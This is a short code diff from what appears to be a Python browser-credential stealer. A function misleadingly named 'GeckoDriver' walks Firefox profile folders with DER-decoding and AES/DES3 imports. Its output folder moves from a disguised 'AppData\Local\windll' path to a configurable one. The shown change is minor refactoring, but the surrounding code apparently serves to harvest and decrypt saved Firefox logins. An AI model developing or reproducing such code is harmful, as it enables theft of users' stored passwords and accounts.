@@ -24,6 +24,7 @@ from glob import glob
 from pyasn1.codec.der.decoder import decode as der_decode
 from manager.logger import Log
 from Crypto.Cipher import AES, DES3
+from preferences.config import config
 
 
 MAGIC1 = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
@@ -223,7 +224,8 @@ def GeckoDriver():
     msgInfo = ""
     Log("===========GeckoDriver===========")
     appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'
-    pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local\windll'
+    user = environ['USERPROFILE']
+    pathtofile = f'{user}\\{config.pathToLogs}'
 
     browsers = {
         "firefox": appdata + "\\Mozilla\\Firefox\\Profiles",
